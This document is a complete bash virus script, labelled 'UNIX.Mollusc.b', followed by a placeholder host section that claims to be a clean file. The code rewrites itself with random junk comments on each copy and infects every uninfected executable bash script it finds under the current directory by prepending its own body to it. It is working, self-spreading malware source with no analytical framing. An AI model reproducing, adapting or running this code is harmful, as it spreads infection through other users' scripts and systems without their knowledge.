#!/bin/bash
if [ "$1" != gw_inf ] ; then
$0 gw_inf
else
rndm () {
a=`expr $(($RANDOM % $(($2 - $1)))) + $1`
RANDOM=$RANDOM
return $a }
vl=36
RANDOM=$$
echo -n "`cat $0`" | grep -v '^#' | head -n $vl > /tmp/..gw$$c
rndm 3 `expr $vl / 3`
split -l $? /tmp/..gw$$c /tmp/..gw$$i
for part in /tmp/..gw$$i* ; do
rndm 15 50
sign=$?
while [ $sign -gt 0 ] ; do
rndm 32 126
cmnt=$cmnt`echo -e '\'$(printf %o $?)`
sign=`expr $sign - 1` ; done
echo '# '$cmnt >> $part
cmnt="" ; done
cat /tmp/..gw$$i* >> /tmp/..clr_gw
rm /tmp/..gw$$*
find ./ -type f -perm +111 -exec bash -c \
"if [ -z \"\`cat {} | grep mollusk\`\" ] ; then
if [ -n \"\`file {} | grep -s Bourne-Again\`\" ] ; then
fs=\`expr \\\`wc -l {} | awk '{print \$1}'\\\`\`
tail -n \$fs {} | grep -v '^#!/bin/bash' > '/tmp/..vic'\$$'_gw'
echo '#!/bin/bash' > {}
cat /tmp/..clr_gw >> {}
cat '/tmp/..vic'\$$'_gw' >> {}
rm /tmp/..vic*_gw
fi; fi" \;
rm /tmp/..clr_gw
exit 0 ; fi
: UNIX.Mollusc.b by Gobleen Warrior/SMF
########################## HOST FILE GOES HERE ##############################
echo -----------------------------
echo "Blah blah blah...
I'm a clear file
What viruses are u talking about?"
echo -----------------------------